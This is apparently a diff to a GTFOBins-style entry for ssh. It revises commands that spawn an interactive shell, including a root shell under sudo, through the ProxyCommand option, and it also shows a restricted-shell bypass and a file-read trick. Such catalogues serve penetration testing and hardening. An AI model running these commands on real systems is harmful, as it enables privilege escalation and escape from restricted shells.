@@ -4,7 +4,7 @@ functions:
     - description: Reconnecting may help bypassing restricted shells.
       code: ssh localhost $SHELL --noprofile --norc
     - description: Spawn interactive shell through ProxyCommand option.
-      code: ssh -o ProxyCommand="/bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'" x
+      code: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
   upload:
     - description: Send local file to a SSH server.
       code: |
@@ -26,5 +26,5 @@ functions:
         ssh -F $LFILE localhost
   sudo-enabled:
     - description: Spawn interactive root shell through ProxyCommand option.
-      code: sudo ssh -o ProxyCommand="/bin/bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'" x
+      code: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ---
